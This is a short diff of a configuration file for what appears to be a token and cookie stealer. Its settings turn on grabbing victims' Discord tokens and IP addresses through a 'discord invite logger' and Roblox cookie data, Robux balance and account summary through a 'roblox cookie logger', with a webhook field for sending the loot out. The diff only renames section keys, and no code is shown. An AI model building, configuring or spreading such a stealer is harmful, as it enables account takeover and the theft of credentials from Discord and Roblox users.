@@ -1,4 +1,4 @@
- discord invite logger settings:
+ discord_invite_ logger_ settings:
   grab minecraft log info: false
   grab ip address: true
   grab discord token: true
@@ -6,7 +6,7 @@
 webhook_settings:
  webhook: "webhook here"
 
-roblox cookie logger settings:
+roblox_ cookie_ logger_ settings:
   grab robux balance: true
   grab ip address: false
   grab summary: true
